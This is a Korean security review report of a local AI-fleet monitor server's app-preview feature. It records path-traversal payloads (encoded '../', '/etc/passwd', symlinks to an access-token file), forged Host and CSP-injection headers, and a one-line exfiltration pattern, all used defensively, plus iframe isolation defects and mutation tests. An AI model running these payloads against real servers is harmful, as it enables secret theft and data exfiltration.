# R10 적대적 검수 (T-133, S1)

## 판정
**결함 4건을 고쳐야 한다.** 저장소는 새지 않는다(경로 탈출 61가지 전부 404/413/400). 하지만 이번 라운드의 핵심 기능인 **"모니터 안 iframe 실행"이 현재 트리에서 동작하지 않는다**(결함 1, 인증을 켜면 CSS 까지 막힘). 그리고 **"새 탭에서 열기"는 결과물 코드에 사람의 인증 세션을 그대로 넘긴다**(결함 2).
`browser_monitor_ui.py` 는 **아무것도 깨뜨리지 않은 기준 상태에서 이미 4/6**이다. 이 라운드가 초록으로 보고됐다면 그 보고가 틀렸다.

## 실제로 돌려 본 것
스크립트는 전부 `/tmp/t133/` 아래에 있다(저장소 밖). 서버는 `server.Handler` 를 임시 포트에 띄웠고, 루트는 `/tmp/t133/root`(가짜 비밀 `AIMEM-SECRET-CONTENT`, `.aimem/tls/access-token`=`SECRET-TOKEN-VALUE…`)에 두었다. 응답 본문에 비밀 문자열이 들어 있는지는 바이트 단위로 찾았다.

| # | 시도한 것 | 명령 | 결과 |
|---|---|---|---|
| 1 | `..%2f..%2f..%2fAIMEM.md`, `..%252f`(이중 인코딩), `%2e%2e/`, `%2e%2e%2f`, `....//`, `..\`, `..%5c`, `%c0%ae`, `%u002e`, `;/../` | `python3 /tmp/t133/attack.py` | 전부 404. 새는 것 없음 |
| 2 | 널바이트 `index.html%00`, `%00.js` | 위와 같음 | 400 |
| 3 | 절대 경로 `/etc/passwd`, `//etc/passwd`, `%2fetc%2fpasswd`, 절대형 요청줄 `http://127.0.0.1/app/ok/index.html` | 위와 같음 | 404 (절대형은 정상 파일만 200) |
| 4 | `app.json` root 에 `"../.."`, 절대 경로, `"."`, `web\..\..`, 저장소 밖 디렉터리 링크, 중간 링크(`up/.aimem`, `up/projects`) | 위와 같음 | 전부 `runnable: False`, 404 |
| 5 | `app.json` 자체가 링크, entry 가 링크, 프로젝트 폴더 자체가 링크 | 위와 같음 | 404 |
| 6 | 앱 폴더 **안** 링크 → `.aimem/tls/access-token`(파일 링크·디렉터리 링크), `AIMEM.md` | 위와 같음 | 404 |
| 7 | 숨김 파일 `.hidden`, `%2ehidden` | 위와 같음 | 404 |
| 8 | 프로젝트 이름 자리 `..`, `%2e%2e`, `..%2f..%2f`, `./ok`, 빈 이름, 5000자 이름, 한글 600바이트 이름 | 위와 같음 | 404 (5000자는 일반 404 JSON 에 경로가 그대로 실림. JSON+nosniff 라 무해) |
| 9 | `PROJECT_APP_FILE_MAX_BYTES+10` 바이트 파일 | 위와 같음 | **413, 72바이트 오류 JSON**. 잘린 본문이 나가지 않음 |
| 10 | 무인증 `/app/ok/`, `/app/ok/index.html`, `/app/ok`, `/login/../app/ok/index.html`, `/favicon.ico/../app/…` | 위와 같음 | 전부 **302 → /login**, 본문 0바이트 |
| 11 | 무인증 `/app/ok/x/../../../login`, `/app/../login` | 위와 같음 | 200 로그인 화면 (normpath 결과가 `/login`. 앱 파일은 안 나감, 무해) |
| 12 | `AUTH_EXEMPT_PATHS` 에 `/app/` 이 있나 | 위와 같음 | `/app` 으로 시작하는 것은 `/apple-touch-icon.png` 뿐 (접두 비교가 아니라 완전 일치라 무관) |
| 13 | `/app/` 응답의 CSP 헤더 개수 | 위와 같음 | **1개**. `frame-ancestors 'self'`, `'none'` 없음. 404 응답은 기본 CSP(`'none'`) 1개 |
| 14 | `Host: evil.com` (`skip_host=True` 로 진짜 바꿈) | `python3 /tmp/t133/host.py` | **CSP 에 `http://evil.com` 이 들어감** (아래 판단 참고). `a b`, `evil.com;script-src *`, `*`, `evil.com'`, 101자, `x:1 https://cdn.attacker`, `/x` 는 정규식에 걸려 `'self'` 만 남음. 개행은 클라이언트가 못 보냄 |
| 15 | 인증 켜고 로그인한 뒤 `실행` → iframe 안쪽 상태 | `python3 /tmp/t133/authbrowser.py` | origin=`null`. **css 302, ui.js CORS 차단, 보드 타일 0개** (결함 1) |
| 16 | 같은 iframe 에서 `fetch('/api/state')`, `POST /api/requests`(cors·no-cors), `document.cookie`, `parent.document` | 위와 같음 | 전부 차단(CORS 에러, no-cors POST 는 쿠키 없이 401, SecurityError). **격리는 실제로 된다** |
| 17 | 같은 브라우저에서 새 탭 `/app/웹워들/` → `fetch('/api/state')`, `POST /api/requests` | 위와 같음 | **GET 200 (120465바이트), POST 가 처리기까지 감**(객체가 아닌 본문을 보내 400 으로 멈추게 함) (결함 2) |
| 18 | 기준 브라우저 검사(아무것도 안 깨뜨림) | `python3 tests/browser_monitor_app.py` / `python3 tests/browser_monitor_ui.py` | app 8/8, **ui 4/6** (4번 안쪽 보드, 5번 패널 잘림) |
| 19 | iframe 안 콘솔 진단 | `python3 /tmp/t133/diag.py` | `Access to script at '…/js/ui.js' from origin 'null' has been blocked by CORS policy` |
| 20 | 전체 단위 시험 | `python3 -m unittest discover -s tests` | `Ran 450 tests` / `OK (skipped=1)`. 432개보다 줄지 않음 |
| 21 | JS 문법 | `node --check tools/aimem_monitor/static/app.js` | 통과 |
| 22 | `sw.js` 가 `/app/` 을 우회하나 | `sed -n` 로 읽음 | 우회함: `if (url.pathname.startsWith('/app/')) return;` 이 캐시 분기보다 앞에 있고 버전은 `aimem-shell-v12` |

### `Host` 를 믿는 것으로 할 수 있는 일 (#14)
**찾은 것이 없다.** 위조된 Host 는 그 요청을 보낸 쪽의 응답 CSP 만 바꾼다. 브라우저는 Host 를 URL 에서 정하므로 공격자가 피해자 브라우저에 `Host: evil.com` 을 실어 보낼 수 없다. `Cache-Control: no-store` 라 캐시 오염도 없다. DNS 리바인딩이면 페이지 출처가 이미 evil.com 이라 CSP 에 그 이름이 있어도 얻는 것이 없고, 세션 쿠키는 원래 호스트에 묶여 있어 실리지 않는다. 정규식이 공백·`;`·`'`·`/`·`*` 를 막아 지시어 주입도 안 된다. 다만 허용 목록이 아니라 꼴 검사뿐이라는 점은 적어 둔다(아래 결함 아님 항목).

### 새 탭(같은 출처)으로 가능한 것 (#17)
결과물 JS 가 **로그인한 사람의 쿠키로 모니터 API 를 모두 부를 수 있다.** 읽기(`/api/state`, `/api/runs/*`), 쓰기(`/api/requests`, `/api/archive`, 슬롯·함대 동작)가 다 되고, Origin==Host 검사도 같은 출처라 통과한다. `connect-src 'self'` 가 fetch 로 밖에 보내는 것은 막지만 `location = 'https://x/?'+data` 같은 이동은 CSP 가 막지 않는다.

## 결함

### 결함 1 - 모니터 안 iframe 실행이 동작하지 않는다 (심각도 높음)
- 어디: `tools/aimem_monitor/server.py:2486` (`/app/` 200 응답, CORS 헤더 없음) + `tools/aimem_monitor/static/app.js:2705` (sandbox, `allow-same-origin` 없음 → origin `null`) + `projects/웹워들/web/index.html:68` (`<script type="module">`) + `server.py:2301` (`SameSite=Strict` 쿠키)
- 무엇이: sandbox iframe 의 출처는 `null` 이다. 모듈 스크립트는 언제나 CORS 로 받으므로 `ui.js` 가 막힌다.
  - 인증 끔(`python3 tests/browser_monitor_ui.py`): `[FAIL] 안쪽 보드가 진짜로 그려졌다 - 대기 오류=TimeoutError`, 콘솔 `Access to script at 'http://127.0.0.1:33703/app/%EC%9B%B9%EC%9B%8C%EB%93%A4/js/ui.js' from origin 'null' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present`
  - 인증 켬(`python3 /tmp/t133/authbrowser.py`): 위에 더해 `resp 302 …/css/style.css`. 불투명 출처의 하위 요청에는 SameSite=Strict 쿠키가 실리지 않아 **CSS 까지 로그인으로 튕긴다.** 운영은 인증을 켜고 돌므로 **CORS 헤더만 더해서는 고쳐지지 않는다.**
  - 확인 실험: 사본에서 `/app/` 응답에 `Access-Control-Allow-Origin: null` 만 더하면 인증을 끈 ui 검사 4번이 초록이 된다(M8). 진단이 맞다.
- 어떻게 고쳐야 하는가: iframe 하위 요청을 쿠키 없이 인가해야 한다. 예를 들어 서버가 앱 하나에만 유효한 짧은 HMAC 경로 토큰을 만들어(`/app/<이름>/~<서명>/…`) `/app/` 에서는 쿠키 대신 그것을 받고, `/app/` 응답에만 `Access-Control-Allow-Origin: null` 을 붙인다(Allow-Credentials 없음). 아니면 앱을 다른 포트(별도 출처)로 낸다. `allow-same-origin` 을 더하는 것은 **답이 아니다**(결함 2 가 iframe 으로 옮겨 온다). **브라우저 검사는 인증을 켠 채로도 한 번 돌아야 한다.** 지금 하네스가 `require_auth: False` 라 302 를 보지 못한다.

### 결함 2 - "새 탭에서 열기"는 결과물 코드에 사람의 세션을 넘긴다 (심각도 보통)
- 어디: `tools/aimem_monitor/static/app.js:2692-2698` (`/app/<이름>/` 같은 출처 링크), `server.py:1993` (`app_csp` 에 `connect-src 'self'`)
- 무엇이: `python3 /tmp/t133/authbrowser.py` → `newtab reach: {"get": 200, "len": 120465, "post": "400 {… JSON 객체가 아닙니다 …}"}`. 결과물 JS 가 로그인한 사람의 권한으로 함대 상태를 읽고, 요청을 만들고, 아카이브·슬롯 동작을 부를 수 있다. 결과물은 작업자 AI 가 쓴 코드다. **`projects/` 에 쓸 수 있다는 권한이 "사람으로서 모니터를 조작한다"는 권한으로 커진다.**
- 어떻게 고쳐야 하는가: `/app/` 응답 CSP 에 `sandbox allow-scripts allow-popups allow-modals` 지시어를 넣으면 새 탭도 불투명 출처가 된다(결함 1 과 같은 쿠키 없는 인가가 필요). 아니면 새 탭 링크를 결함 1 의 별도 출처나 경로 토큰으로 낸다. `connect-src` 에서 `'self'` 를 빼도 같은 출처 iframe/이동은 남으므로 그것만으로는 안 된다.

### 결함 3 - 미리보기 칸 아래가 패널 밖으로 잘린다 (심각도 낮음)
- 어디: `tools/aimem_monitor/static/style.css:1325` (`height: min(78vh, 900px); min-height: 420px`) 와 `.detail-panel { max-height: 90vh }`(837), `.detail-body { overflow-y: auto }`(879)
- 무엇이: ui 검사 5번 `[FAIL] 패널 밖으로 잘리지 않는다 - iframe={'y': 157.19, 'height': 702}, detail-body={'y': 71.80, 'height': 753.20}`. iframe 아래 끝 859 가 패널 아래 끝 825 를 34px 넘는다. 1280×900 에서 게임 화면 키보드 맨 아래가 가려져 패널을 따로 스크롤해야 한다(이중 스크롤).
- 어떻게 고쳐야 하는가: iframe 높이를 패널에서 머리줄과 메타 줄을 뺀 값으로 잡는다(`.detail-body` 를 flex 열로 만들고 iframe 을 `flex: 1` 로 두거나 `calc(90vh - …)`).

### 결함 4 - 좁은 화면용 높이 규칙이 죽어 있다 (심각도 낮음)
- 어디: `tools/aimem_monitor/static/style.css:1241` (`@media (max-width: 720px) { .proj-app-frame { height: min(70vh, 640px); } }`)
- 무엇이: 같은 선택자의 기본 규칙(1325)이 **뒤에** 있어서, 미디어 쿼리 안 규칙은 언제나 덮인다(명시도가 같으면 뒤의 것이 이긴다). 폰에서도 `min(78vh, 900px)` 가 된다. 검사는 1280px 폭에서만 돌아 이것을 보지 못한다.
- 어떻게 고쳐야 하는가: 미디어 쿼리 규칙을 1325 뒤로 옮기거나 1325 규칙을 미디어 쿼리 앞으로 옮긴다.

### 결함 아님 (적어 둠)
- `_app_origin()` (`server.py:2349`) 은 꼴만 보고 허용 목록을 보지 않는다. 지금은 악용할 길이 없지만, 나중에 이 출처를 캐시되는 응답이나 리다이렉트에 쓰면 그때는 위험해진다.
- 경로 방어는 `_app_parts`(조각 검사), `_app_inside`(resolve 비교), `is_symlink` **세 겹**이다. 단위 시험은 한 겹만 깨서는 빨개지지 않고 두 겹을 함께 깨야 빨개진다(M6, M7, C2~C4). 겹친 방어의 결과라 결함은 아니다. 다만 겹마다 따로 지키는 시험은 없다.

## 변이 시험 (검사가 진짜 빨개지는가)
**작업 트리는 건드리지 않았다.** 쓰기 범위가 `rounds/R10/REVIEW.md` 하나라서 변이는 저장소 사본 `/tmp/t133/mut`(`.git` 제외)에만 넣었다. 사본에서 각 변이 뒤에 원본 바이트로 되돌리고 `assert` 로 확인했다(`python3 /tmp/t133/mutate.py`, `python3 /tmp/t133/combo.py`). 검사 파일은 `ROOT = parents[1]` 이므로 사본에서 돌면 사본의 제품을 본다.

| 일부러 깨뜨린 곳 | 빨개진 검사 | 되돌렸나 |
|---|---|---|
| (기준) 변경 없음 | ui **4번·5번이 이미 빨강**(4/6), app 8/8 | - |
| M1 `.proj-app-frame` `height: 0` (지시대로) | **ui 2번은 빨개지지 않음**. `min-height: 420px` 이 받쳐 줘 실제로 420px 로 보인다. 그래서 거짓 초록이 아니라 제품이 버틴 것이다(높이가 줄어 5번은 오히려 초록) | 예 |
| M1b `height: 0; min-height: 0` | **ui 2번 빨강** (`height: 2`) | 예 |
| M2 `fr.setAttribute('sandbox', …)` 줄 삭제 | **ui 3번 빨강** (`sandbox=None`). 이때 4번은 초록이 된다: 같은 출처라 모듈이 뜬다 | 예 |
| M2b sandbox 에 `allow-same-origin` 추가 | **ui 3번 빨강** | 예 |
| M3 `fr.src = 'about:blank'` | ui 4번 빨강. 그러나 **기준에서 이미 빨강이라 판정할 수 없음** | 예 |
| C1 M8(CORS null) 위에 M3 | M8 만 넣으면 4번 초록, 여기에 M3 를 더하면 **ui 4번 빨강**. 4번은 진짜로 잡는다 | 예 |
| M4 `app_csp` `frame-ancestors 'self'` → `'none'` | **app 7번 빨강**, 단위 2개 빨강 | 예 |
| M5 `/app/` 에 기본 CSP 헤더를 하나 더 실음(CSP 2개) | **app 7번 빨강**, 단위 `test_app_route_serves_and_uses_one_origin_aware_csp` 빨강 | 예 |
| M6 `_app_parts` 가 `..` 허용 | 단위 18개 OK (resolve 비교가 막음) | 예 |
| M7 `_app_inside` 항상 True | 단위 18개 OK (조각 검사가 막음) | 예 |
| C2 M6+M7 | **`test_repository_files_do_not_leak (rel='../app.json')` 빨강** | 예 |
| C3 M7 + 대상 `is_symlink` 검사 제거 | **`test_symlink_inside_app_folder_is_not_served` 빨강** | 예 |
| C4 대상 `is_symlink` 검사만 제거 | 단위 OK (resolve 비교가 막음) | 예 |

작업 트리 확인: 검수 전후 `md5sum` 이 같다(`style.css 24623e34…`, `app.js 0bc9dfe4…`, `server.py 691a8031…`). `git diff --stat` 은 검수 시작 때와 같다.
```
 .aimem/requests/Q-261111-5593.json                 |   6 +-
 AIMEM-state.md                                     | 101 ++++++-----
 .../README.md"                                     |  10 ++
 tests/test_fleet_ctl.py                            |  52 ++++++
 tools/aimem_monitor/__init__.py                    |  21 ++-
 tools/aimem_monitor/server.py                      | 192 ++++++++++++++++++++-
 tools/aimem_monitor/static/app.js                  |  53 +++++-
 tools/aimem_monitor/static/style.css               |   6 +
 tools/aimem_monitor/static/sw.js                   |   3 +-
 tools/fleet_ctl.py                                 |  39 ++++-
 10 files changed, 423 insertions(+), 60 deletions(-)
```

## 아직 못 본 것
- TLS(`https`) 모드에서의 동작. `Secure` 쿠키, HSTS, 출처 `https://` 를 확인하지 않았다. 다만 결함 1 의 쿠키 문제는 TLS 에서도 같다.
- 실제 폰 브라우저(Safari/WebKit)와 PWA 설치 상태에서 서비스 워커가 `/app/` 을 우회하는지는 코드로만 확인했다.
- 폭 720px 이하 화면에서 미리보기 높이를 브라우저로 재지 않았다(결함 4 는 캐스케이드 규칙으로 판단했다).
- `allow-popups` 로 연 창은 sandbox 를 물려받는다(`allow-popups-to-escape-sandbox` 없음). 이것도 브라우저로는 확인하지 않았다.
- 결함 1 을 고친 뒤 결함 2 의 CSP `sandbox` 지시어가 새 탭에서도 게임을 살려 두는지.
